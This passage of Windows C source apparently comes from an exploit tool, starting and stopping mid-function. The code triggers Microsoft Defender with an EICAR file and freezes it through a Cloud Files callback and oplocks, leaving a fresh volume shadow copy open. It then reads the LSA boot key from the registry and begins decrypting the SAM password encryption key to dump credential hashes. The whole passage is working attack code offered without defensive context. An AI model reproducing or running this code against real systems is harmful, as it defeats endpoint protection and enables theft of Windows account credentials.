		s[r] = t;

		// Move pointers towards each other
		l++;
		r--;
	}
}

void DestroyVSSNamesList(LLShadowVolumeNames* First)
{
	while (First)
	{
		free(First->name);
		LLShadowVolumeNames* next = First->next;
		free(First);
		First = next;
	}
}

LLShadowVolumeNames* RetrieveCurrentVSSList(HANDLE hobjdir, bool* criticalerr, int* vscnumber, DWORD* errorcode)
{


	if (!criticalerr || !vscnumber || !errorcode)
		return NULL;

	*vscnumber = 0;
	ULONG scanctx = 0;
	ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
	ULONG retsz = 0;
	OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
	if (!objdirinfo)
	{
		//printf("Failed to allocate required buffer to query object manager directory.\n");
		*criticalerr = true;
		*errorcode = ERROR_NOT_ENOUGH_MEMORY;
		return NULL;
	}
	ZeroMemory(objdirinfo, reqsz);
	NTSTATUS stat = STATUS_SUCCESS;
	do
	{
		stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, FALSE, &scanctx, &retsz);
		if (stat == STATUS_SUCCESS)
			break;
		else if (stat != STATUS_MORE_ENTRIES)
		{
			//printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
			*criticalerr = true;
			*errorcode = RtlNtStatusToDosError(stat);
			return NULL;
		}

		free(objdirinfo);
		reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
		objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
		if (!objdirinfo)
		{
			//printf("Failed to allocate required buffer to query object manager directory.\n");
			*criticalerr = true;
			*errorcode = ERROR_NOT_ENOUGH_MEMORY;
			return NULL;
		}
		ZeroMemory(objdirinfo, reqsz);
	} while (1);
	void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
	ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
	LLShadowVolumeNames* LLVSScurrent = NULL;
	LLShadowVolumeNames* LLVSSfirst = NULL;
	for (ULONG i = 0; i < ULONG_MAX; i++)
	{
		if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
		{
			free(emptybuff);
			break;
		}
		if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
		{
			wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
			if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
			{
				if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
				{
					(*vscnumber)++;
					if (LLVSScurrent)
					{
						LLVSScurrent->next = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
						if (!LLVSScurrent->next)
						{
							//printf("Failed to allocate memory.\n");
							*criticalerr = true;
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							return NULL;
						}
						ZeroMemory(LLVSScurrent->next, sizeof(LLShadowVolumeNames));
						LLVSScurrent = LLVSScurrent->next;
						LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
						if (!LLVSScurrent->name)
						{
							//printf("Failed to allocate memory !!!\n");
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							*criticalerr = true;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							return NULL;
						}
						ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
						memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);
					}
					else
					{
						LLVSSfirst = (LLShadowVolumeNames*)malloc(sizeof(LLShadowVolumeNames));
						if (!LLVSSfirst)
						{
							//printf("Failed to allocate memory.\n");
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							*criticalerr = true;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							return NULL;
						}
						ZeroMemory(LLVSSfirst, sizeof(LLShadowVolumeNames));
						LLVSScurrent = LLVSSfirst;
						LLVSScurrent->name = (wchar_t*)malloc(objdirinfo[i].Name.Length + sizeof(wchar_t));
						if (!LLVSScurrent->name)
						{
							//printf("Failed to allocate memory !!!\n");
							*errorcode = ERROR_NOT_ENOUGH_MEMORY;
							*criticalerr = true;
							DestroyVSSNamesList(LLVSSfirst);
							free(objdirinfo);
							return NULL;
						}
						ZeroMemory(LLVSScurrent->name, objdirinfo[i].Name.Length + sizeof(wchar_t));
						memmove(LLVSScurrent->name, objdirinfo[i].Name.Buffer, objdirinfo[i].Name.Length);

					}

				}
			}
		}




	}
	free(objdirinfo);
	return LLVSSfirst;
}

DWORD WINAPI ShadowCopyFinderThread(void* fullvsspath)
{

	wchar_t devicepath[] = L"\\Device";
	UNICODE_STRING udevpath = { 0 };
	RtlInitUnicodeString(&udevpath, devicepath);
	OBJECT_ATTRIBUTES objattr = { 0 };
	InitializeObjectAttributes(&objattr, &udevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	NTSTATUS stat = STATUS_SUCCESS;
	HANDLE hobjdir = NULL;
	DWORD retval = ERROR_SUCCESS;
	wchar_t newvsspath[MAX_PATH] = { 0 };
	wcscpy(newvsspath, L"\\Device\\");
	bool criterr = false;
	int vscnum = 0;
	bool restartscan = false;
	ULONG scanctx = 0;
	ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
	ULONG retsz = 0;
	OBJECT_DIRECTORY_INFORMATION* objdirinfo = NULL;
	bool srchfound = false;
	wchar_t vsswinpath[MAX_PATH] = { 0 };
	UNICODE_STRING _vsswinpath = { 0 };

	OBJECT_ATTRIBUTES objattr2 = { 0 };
	IO_STATUS_BLOCK iostat = { 0 };
	HANDLE hlk = NULL;
	LLShadowVolumeNames* vsinitial = NULL;

	stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
	if (stat)
	{
		//printf("Failed to open object manager directory, error : 0x%0.8X", stat);
		retval = RtlNtStatusToDosError(stat);
		return retval;
	}
	void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
	if (!emptybuff)
	{
		//printf("Failed to allocate memory !!!");
		retval = ERROR_NOT_ENOUGH_MEMORY;
		goto cleanup;
	}
	ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));

	
	vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum,&retval);

	if (criterr)
	{
		//printf("Unexpected error while listing current volume shadow copy volumes\n");
		goto cleanup;
	}
	if (!vsinitial)
	{
		//printf("No volume shadow copies were found.\n");
	}
	else
	{
		//printf("Found %d volume shadow copies\n", vscnum);
	}



	stat = STATUS_SUCCESS;

scanagain:
	do
	{
		if (objdirinfo)
			free(objdirinfo);
		objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
		if (!objdirinfo)
		{
			//printf("Failed to allocate required buffer to query object manager directory.\n");
			retval = ERROR_NOT_ENOUGH_MEMORY;
			goto cleanup;
		}
		ZeroMemory(objdirinfo, reqsz);

		scanctx = 0;
		stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, &scanctx, &retsz);
		if (stat == STATUS_SUCCESS)
			break;
		else if (stat != STATUS_MORE_ENTRIES)
		{
			//printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
			retval = RtlNtStatusToDosError(stat);
			goto cleanup;
		}
		reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
	} while (1);
	


	for (ULONG i = 0; i < ULONG_MAX; i++)
	{
		if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
		{
			break;
		}
		if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
		{
			wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
			if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
			{
				if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
				{
					// check against the list if there this is a unique VS Copy
					LLShadowVolumeNames* current = vsinitial;
					bool found = false;
					while (current)
					{
						if (_wcsicmp(current->name, objdirinfo[i].Name.Buffer) == 0)
						{
							found = true;
							break;
						}
						current = current->next;
					}
					if (found)
						continue;
					else
					{
						srchfound = true;
						wcscat(newvsspath, objdirinfo[i].Name.Buffer);
						break;
					}
				}
			}
		}
	}

	if (!srchfound) {
		restartscan = true;
		Sleep(50);
		goto scanagain;
	}
	if (objdirinfo) {
		free(objdirinfo);
		objdirinfo = NULL;
	}
	NtClose(hobjdir);
	hobjdir = NULL;



	//printf("New volume shadow copy detected : %ws\n", newvsspath);


	wcscpy(vsswinpath, newvsspath);
	wcscat(vsswinpath, L"\\Windows");
	RtlInitUnicodeString(&_vsswinpath, vsswinpath);
	InitializeObjectAttributes(&objattr2, &_vsswinpath, OBJ_CASE_INSENSITIVE, NULL, NULL);

retry:
	stat = NtCreateFile(&hlk, FILE_READ_ATTRIBUTES, &objattr2, &iostat, NULL, NULL, NULL, FILE_OPEN, NULL, NULL, NULL);
	if (stat == STATUS_NO_SUCH_DEVICE)
		goto retry;
	if (stat)
	{
		//printf("Failed to open volume shadow copy, error : 0x%0.8X\n", stat);
		retval = RtlNtStatusToDosError(stat);
		goto cleanup;


	}
	//printf("Successfully accessed volume shadow copy.\n");
	CloseHandle(hlk);
	if (fullvsspath)
		wcscpy((wchar_t*)fullvsspath, newvsspath);


cleanup:
	if (hobjdir)
		NtClose(hobjdir);
	if (emptybuff)
		free(emptybuff);
	if (vsinitial)
		DestroyVSSNamesList(vsinitial);

	return retval;
}

DWORD GetWDPID()
{
	static DWORD retval = 0;
	if (retval)
		return retval;

	SC_HANDLE scmgr = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (!scmgr)
		return 0;
	SC_HANDLE hsvc = OpenService(scmgr, L"WinDefend", SERVICE_QUERY_STATUS);
	CloseServiceHandle(scmgr);
	if (!hsvc)
		return 0;


	SERVICE_STATUS_PROCESS ssp = { 0 };
	DWORD reqsz = sizeof(ssp);
	bool res = QueryServiceStatusEx(hsvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, reqsz, &reqsz);
	CloseServiceHandle(hsvc);
	if (!res)
		return 0;
	retval = ssp.dwProcessId;
	return retval;

}

void CfCallbackFetchPlaceHolders(
	_In_ CONST CF_CALLBACK_INFO* CallbackInfo,
	_In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters
) {

	//printf("CfCallbackFetchPlaceHolders triggered !\n");

	CF_PROCESS_INFO* cpi = CallbackInfo->ProcessInfo;
	wchar_t* procname = PathFindFileName(cpi->ImagePath);
	//printf("Directory query from %ws\n", procname);
	if (GetWDPID() == cpi->ProcessId)
	{
		cldcallbackctx* ctx = (cldcallbackctx*)CallbackInfo->CallbackContext;
		SetEvent(ctx->hnotifywdaccess);;

		//printf("Defender flagged.\n");
		CF_OPERATION_INFO cfopinfo = { 0 };
		cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
		cfopinfo.Type = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
		cfopinfo.ConnectionKey = CallbackInfo->ConnectionKey;
		cfopinfo.TransferKey = CallbackInfo->TransferKey;
		cfopinfo.CorrelationVector = CallbackInfo->CorrelationVector;
		cfopinfo.RequestKey = CallbackInfo->RequestKey;
		//STATUS_CLOUD_FILE_REQUEST_TIMEOUT
		SYSTEMTIME systime = { 0 };
		FILETIME filetime = { 0 };
		GetSystemTime(&systime);
		SystemTimeToFileTime(&systime, &filetime);

		FILE_BASIC_INFO filebasicinfo = { 0 };
		filebasicinfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
		CF_FS_METADATA fsmetadata = { filebasicinfo, {0x1000} };
		CF_PLACEHOLDER_CREATE_INFO placeholder[1] = { 0 };
		GUID uid = { 0 };
		RPC_WSTR wuid = { 0 };
		UuidCreate(&uid);
		UuidToStringW(&uid, &wuid);
		wchar_t* wuid2 = (wchar_t*)wuid;
		placeholder[0].RelativeFileName = ctx->filename;

		placeholder[0].FsMetadata = fsmetadata;

		UuidCreate(&uid);
		UuidToStringW(&uid, &wuid);
		wuid2 = (wchar_t*)wuid;
		placeholder[0].FileIdentity = wuid2;
		placeholder[0].FileIdentityLength = lstrlenW(wuid2) * sizeof(wchar_t);
		placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE;


		CF_OPERATION_PARAMETERS cfopparams = { 0 };
		cfopparams.ParamSize = sizeof(cfopparams);
		cfopparams.TransferPlaceholders.PlaceholderCount = 1;
		cfopparams.TransferPlaceholders.PlaceholderTotalCount.QuadPart = 1;
		cfopparams.TransferPlaceholders.EntriesProcessed = 0;
		cfopparams.TransferPlaceholders.Flags = CF_OPERATION_TRANSFER_PLACEHOLDERS_FLAG_NONE;
		cfopparams.TransferPlaceholders.PlaceholderArray = placeholder;

		WaitForSingleObject(ctx->hnotifylockcreated, INFINITE);
		HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
		//printf("CfExecute returned : 0x%0.8X\n", hs);
		return;
	}
	CF_OPERATION_INFO cfopinfo = { 0 };
	cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
	cfopinfo.Type = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
	cfopinfo.ConnectionKey = CallbackInfo->ConnectionKey;
	cfopinfo.TransferKey = CallbackInfo->TransferKey;
	cfopinfo.CorrelationVector = CallbackInfo->CorrelationVector;
	cfopinfo.RequestKey = CallbackInfo->RequestKey;
	CF_OPERATION_PARAMETERS cfopparams = { 0 };
	cfopparams.ParamSize = sizeof(cfopparams);
	cfopparams.TransferPlaceholders.PlaceholderCount = 0;
	cfopparams.TransferPlaceholders.PlaceholderTotalCount.QuadPart = 0;
	cfopparams.TransferPlaceholders.EntriesProcessed = 0;
	cfopparams.TransferPlaceholders.Flags = CF_OPERATION_TRANSFER_PLACEHOLDERS_FLAG_NONE;
	cfopparams.TransferPlaceholders.PlaceholderArray = { 0 };
	HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
	//printf("CfExecute : 0x%0.8X\n", hs);

	return;


}

DWORD WINAPI FreezeVSS(void* arg)
{
	cloudworkerthreadargs* args = (cloudworkerthreadargs*)arg;
	if (!args)
		return ERROR_BAD_ARGUMENTS;

	HANDLE hlock = NULL;
	HRESULT hs;
	CF_SYNC_REGISTRATION cfreg = { 0 };
	cfreg.StructSize = sizeof(CF_SYNC_REGISTRATION);
	cfreg.ProviderName = L"IHATEMICROSOFT";
	cfreg.ProviderVersion = L"1.0";
	CF_SYNC_POLICIES syncpolicy = { 0 };
	syncpolicy.StructSize = sizeof(CF_SYNC_POLICIES);
	syncpolicy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
	syncpolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
	syncpolicy.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_VALIDATION_REQUIRED;
	syncpolicy.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
	syncpolicy.InSync = CF_INSYNC_POLICY_NONE;
	CF_CALLBACK_REGISTRATION callbackreg[2];
	callbackreg[0] = { CF_CALLBACK_TYPE_FETCH_PLACEHOLDERS, CfCallbackFetchPlaceHolders };
	callbackreg[1] = { CF_CALLBACK_TYPE_NONE, NULL };
	CF_CONNECTION_KEY cfkey = { 0 };
	OVERLAPPED ovd = { 0 };
	DWORD nwf = 0;
	//wchar_t syncroot[] = L"C:\\temp";
	wchar_t syncroot[MAX_PATH] = { 0 };
	GetModuleFileName(GetModuleHandle(NULL), syncroot, MAX_PATH);
	*(PathFindFileName(syncroot) - 1) = L'\0';
	DWORD retval = STATUS_SUCCESS;
	wchar_t lockfile[MAX_PATH];
	wcscpy(lockfile, syncroot);
	wcscat(lockfile, L"\\");
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	UuidCreate(&uid);
	UuidToStringW(&uid, &wuid);
	wchar_t* wuid2 = (wchar_t*)wuid;
	wcscat(lockfile, wuid2);
	wcscat(lockfile, L".lock");
	cldcallbackctx callbackctx = { 0 };
	bool syncrootregistered = false;
	callbackctx.hnotifywdaccess = CreateEvent(NULL, FALSE, FALSE, NULL);
	callbackctx.hnotifylockcreated = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!callbackctx.hnotifylockcreated || !callbackctx.hnotifywdaccess)
	{
		//printf("Failed to create event, error : %d", GetLastError());
		retval = GetLastError();
		goto cleanup;
	}
	wcscpy(callbackctx.filename, wuid2);
	wcscat(callbackctx.filename, L".lock");
	hlock = CreateFile(lockfile, GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if (!hlock || hlock == INVALID_HANDLE_VALUE)
	{
		//printf("Failed to create lock file %ws error : %d", lockfile, GetLastError());
		retval = GetLastError();
		goto cleanup;
	}


	//CreateDirectory(syncroot, NULL);
	hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_NONE);
	if (hs)
	{
		//printf("Failed to register syncroot, hr = 0x%0.8X\n", hs);
		retval = ERROR_UNIDENTIFIED_ERROR;
		goto cleanup;
	}
	syncrootregistered = true;
	hs = CfConnectSyncRoot(syncroot, callbackreg, &callbackctx, CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
	if (hs)
	{
		//printf("Failed to connect to syncroot, hr = 0x%0.8X\n", hs);
		retval = ERROR_UNIDENTIFIED_ERROR;
		goto cleanup;
	}
	if (args->hlock) {
		CloseHandle(args->hlock);
		args->hlock = NULL;
	}

	//printf("Waiting for callback...\n");

	WaitForSingleObject(callbackctx.hnotifywdaccess, INFINITE);

	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!ovd.hEvent)
	{
		//printf("Failed to create event, error : %d\n", GetLastError());
		retval = GetLastError();
		goto cleanup;
	}
	DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);

	if (GetLastError() != ERROR_IO_PENDING)
	{
		//printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
		retval = GetLastError();
		goto cleanup;
	}
	SetEvent(callbackctx.hnotifylockcreated);

	//printf("Waiting for oplock to trigger...\n");

	GetOverlappedResult(hlock, &ovd, &nwf, TRUE);

	//printf("WD is frozen and the new VSS can be used.\n");

	SetEvent(args->hvssready);

	WaitForSingleObject(args->hcleanupevent, INFINITE);

	
	
cleanup:

	if (hlock)
		CloseHandle(hlock);
	if (callbackctx.hnotifylockcreated)
		CloseHandle(callbackctx.hnotifylockcreated);
	if (callbackctx.hnotifywdaccess)
		CloseHandle(callbackctx.hnotifywdaccess);
	if (ovd.hEvent)
		CloseHandle(ovd.hEvent);

	if (syncrootregistered)
	{
		CfDisconnectSyncRoot(cfkey);
		CfUnregisterSyncRoot(syncroot);
	}
	

	return retval;

}


bool TriggerWDForVS(HANDLE hreleaseevent,wchar_t* fullvsspath)
{
	GUID uid = { 0 };
	RPC_WSTR wuid = { 0 };
	UuidCreate(&uid);
	UuidToStringW(&uid, &wuid);
	wchar_t* wuid2 = (wchar_t*)wuid;

	wchar_t workdir[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%TEMP%\\", workdir, MAX_PATH);
	wcscat(workdir, wuid2);
	wchar_t eicarfilepath[MAX_PATH] = { 0 };
	wcscpy(eicarfilepath,workdir);
	wcscat(eicarfilepath,L"\\foo.exe");

	HANDLE hlock = NULL;
	wchar_t rstmgr[MAX_PATH] = { 0 };
	ExpandEnvironmentStrings(L"%windir%\\System32\\RstrtMgr.dll", rstmgr, MAX_PATH);
	OVERLAPPED ovd = { 0 };
	char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
	rev(eicar);
	DWORD nwf = 0;
	cloudworkerthreadargs cldthreadargs = { 0 };
	DWORD tid = 0;
	HANDLE hthread = NULL;
	bool dircreated = false;
	bool retval = true;
	HANDLE hfile = NULL;
	HANDLE trigger = NULL;
	HANDLE hthread2 = NULL;
	HANDLE hobj[2] = { 0 };
	DWORD exitcode = STATUS_SUCCESS;
	DWORD waitres = 0;
	hthread = CreateThread(NULL, NULL, ShadowCopyFinderThread, (void*)fullvsspath, NULL, &tid);
	if (!hthread)
	{
		//printf("Failed to create worker thread, error : %d", GetLastError());
		retval = false;
		goto cleanup;
	}
	
	dircreated = CreateDirectory(workdir, NULL);
	if (!dircreated)
	{
		//printf("Failed to create working directory, error : %d\n",GetLastError());
		retval = false;
		goto cleanup;
	}

	hfile = CreateFile(eicarfilepath, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if (!hfile || hfile == INVALID_HANDLE_VALUE)
	{
		//printf("Failed to create eicar test file, error : %d\n", GetLastError());
		retval = false;
		goto cleanup;
	}


	
	if (!WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL))
	{
		//printf("Failed to write eicar test file, error : %d\n", GetLastError());
		retval = false;
		goto cleanup;
	}


	hlock = CreateFile(rstmgr, GENERIC_READ | SYNCHRONIZE, NULL, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
	if (!hlock || hlock == INVALID_HANDLE_VALUE)
	{
		//printf("Failed to open restart manager dll for exclusive access, error : %d\nTry again later.\n", GetLastError());
		retval = false;
		goto cleanup;
	}


	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (!ovd.hEvent)
	{
		//printf("Failed to create event object with error : %d !!!!\n", GetLastError());
		retval = false;
		goto cleanup;
	}

	SetLastError(ERROR_SUCCESS);
	DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);

	if (GetLastError() != ERROR_IO_PENDING)
	{
		//printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
		retval = false;
		goto cleanup;
	}

	// trigger wd for action
	trigger = CreateFile(eicarfilepath, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (trigger && trigger != INVALID_HANDLE_VALUE)
		CloseHandle(trigger);

	//printf("Waiting for oplock to trigger...\n");
	GetOverlappedResult(hlock, &ovd, &nwf, TRUE);
	//printf("Oplock triggered.\n");

	// Wait for the VSS finder thread to finish before checking its exit code.
	// Without this, GetExitCodeThread can return STILL_ACTIVE (259) if the
	// thread is between its last print and its return statement.
	//printf("Waiting for VSS finder thread to complete...\n");
	WaitForSingleObject(hthread, 30000);

	if (!GetExitCodeThread(hthread, &exitcode))
	{
		//printf("Unexpected error while getting worker thread exit code");
		retval = false;
		goto cleanup;
	}
	if (exitcode)
	{
		//printf("Failed to get new volume shadow copy path, thread exit code: %d\n", exitcode);
		retval = false;
		goto cleanup;

	}


	cldthreadargs.hcleanupevent = hreleaseevent;
	cldthreadargs.hlock = hlock;
	cldthreadargs.hvssready = CreateEvent(NULL, FALSE, FALSE, NULL);
	
	hthread2 = CreateThread(NULL, NULL, FreezeVSS, &cldthreadargs, NULL, &tid);
	if (!hthread2) {
		//printf("Unable to create worker thread, error : %d", GetLastError());
		retval = false;
		goto cleanup;
	}



	hobj[0] = hthread2;
	hobj[1] = cldthreadargs.hvssready;
	waitres = WaitForMultipleObjects(2, hobj, FALSE, INFINITE);

	if (waitres - WAIT_OBJECT_0 == 0)
	{
		//printf("Unable to freeze WD, thread exited prematurely.\n");
		retval = false;
	}

cleanup:


	if (hthread)
		CloseHandle(hthread);
	if(hthread2)
		CloseHandle(hthread2);
	if(cldthreadargs.hvssready)
		CloseHandle(cldthreadargs.hvssready);
	if (ovd.hEvent)
		CloseHandle(ovd.hEvent);
	if (hfile)
		CloseHandle(hfile);
	if (dircreated)
		RemoveDirectory(workdir);

	return retval;



}
//////////////////////////////////////////////////////////////////////
// Volume shadow copy functions end
/////////////////////////////////////////////////////////////////////



void hex_string_to_bytes(const char* hex_string, unsigned char* byte_array, size_t max_len) {
	size_t len = strlen(hex_string);
	if (len % 2 != 0) {
		//fprintf(stderr, "Error: Hex string length must be even.\n");
		return;
	}

	size_t byte_len = len / 2;
	if (byte_len > max_len) {
		//fprintf(stderr, "Error: Output buffer too small.\n");
		return;
	}

	for (size_t i = 0; i < byte_len; i++) {
		// Read two hex characters and convert them to an unsigned int
		unsigned int byte_val;
		if (sscanf(&hex_string[i * 2], "%2x", &byte_val) != 1) {
			//fprintf(stderr, "Error: Invalid hex character in string.\n");
			return;
		}
		byte_array[i] = (unsigned char)byte_val;
	}
}

bool GetLSASecretKey(unsigned char bootkeybytes[16])
{

	const wchar_t* keynames[] = { {L"JD"}, {L"Skew1"}, {L"GBG"}, {L"Data"} };
	int indices[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };


	//ORHKEY hlsa = NULL;
	HKEY hlsa = NULL;
	DWORD err = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Lsa", NULL, KEY_READ, &hlsa);
	char data[0x1000] = { 0 };
	DWORD index = 0;
	for (const wchar_t* keyname : keynames)
	{
		DWORD retsz = sizeof(data) / sizeof(char);
		HKEY hbootkey = NULL;
		err = RegOpenKeyEx(hlsa, keyname, NULL, KEY_QUERY_VALUE, &hbootkey);

		err = RegQueryInfoKeyA(hbootkey, &data[index], &retsz, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
		index += retsz;
		RegCloseKey(hbootkey);
	}
	////printf("%s\n", data);
	RegCloseKey(hlsa);

	if (strlen(data) < 16)
	{
		//printf("Boot key mismatch.");
		return 1;
	}

	// convert hex string to binary
	unsigned char keybytes[16] = { 0 };
	hex_string_to_bytes(data, keybytes, 16);



	for (int i = 0; i < sizeof(keybytes); i++)
	{

		bootkeybytes[i] = keybytes[indices[i]];
	}
	return true;

}

void* UnprotectAES(char* lsaKey, char* iv, char* hashdata, unsigned long enclen, int* decryptedlen)
{

	char* decrypted = (char*)malloc(enclen);
	memmove(decrypted, hashdata, enclen);
	HCRYPTPROV hprov = NULL;

	CryptAcquireContext(&hprov, 0, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

	struct aes128keyBlob
	{
		BLOBHEADER hdr;
		DWORD keySize;
		BYTE bytes[16];
	} blob;

	blob.hdr.bType = PLAINTEXTKEYBLOB;
	blob.hdr.bVersion = CUR_BLOB_VERSION;
	blob.hdr.reserved = 0;
	blob.hdr.aiKeyAlg = CALG_AES_128;
	blob.keySize = 16;
	memmove(blob.bytes, lsaKey, 16);
	HCRYPTKEY hcryptkey = NULL;
	CryptImportKey(hprov, (const BYTE*)&blob, sizeof(aes128keyBlob), NULL, NULL, &hcryptkey);

	DWORD mode = CRYPT_MODE_CBC;
	CryptSetKeyParam(hcryptkey, KP_IV, (const BYTE*)iv, NULL);
	
	CryptSetKeyParam(hcryptkey, KP_MODE, (const BYTE*)&mode, NULL);

	DWORD retsz = enclen;

	CryptDecrypt(hcryptkey, NULL, TRUE, CRYPT_DECRYPT_RSA_NO_PADDING_CHECK, (BYTE*)decrypted, &retsz);

	CryptDestroyKey(hcryptkey);
	CryptReleaseContext(hprov, NULL);

	if (decryptedlen)
		*decryptedlen = retsz;

	return decrypted;

}

#ifndef SHA256_DIGEST_LENGTH
#define SHA256_DIGEST_LENGTH 32
#endif

bool ComputeSHA256(char* data, int size, char hashout[SHA256_DIGEST_LENGTH])
{


	HCRYPTPROV hprov = NULL;
	CryptAcquireContext(&hprov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
	HCRYPTHASH Hhash = NULL;
	CryptCreateHash(hprov, CALG_SHA_256, NULL, NULL, &Hhash);
	CryptHashData(Hhash, (const BYTE*)data, size, NULL);
	DWORD md_len = 0;
	DWORD inputsz = sizeof(md_len);
	CryptGetHashParam(Hhash, HP_HASHSIZE, (BYTE*)&md_len, &inputsz, NULL);
	//inputsz = size;
	CryptGetHashParam(Hhash, HP_HASHVAL, (BYTE*)hashout, &md_len, NULL);

	CryptDestroyHash(Hhash);
	CryptReleaseContext(hprov, NULL);
	/*
	EVP_MD_CTX* en = EVP_MD_CTX_new();

	bool retval = EVP_DigestInit(en, EVP_sha256());
	if (!retval)
		return retval;
	retval = EVP_DigestUpdate(en, data, size);
	if (!retval)
		return retval;
	EVP_DigestFinal(en, (unsigned char*)hashout, NULL);
	*/
	//return retval;
	return true;



}

void* UnprotectPasswordEncryptionKeyAES(char* data, char* lsaKey, int* keysz)
{

	int hashlen = data[0];
	int enclen = data[4];

	char iv[16] = { 0 };
	memmove(iv, &data[8], sizeof(iv));

	char* cyphertext = (char*)malloc(enclen);
	memmove(cyphertext, &data[0x18], enclen);

	// first arg, lsaKey | second arg, iv | thid arg, ciphertext
	int outsz = 0;
	int pekoutsz = 0;
	char* pek = (char*)UnprotectAES(lsaKey, iv, cyphertext, enclen, &pekoutsz);
	free(cyphertext);

	char* hashdata = (char*)malloc(hashlen);
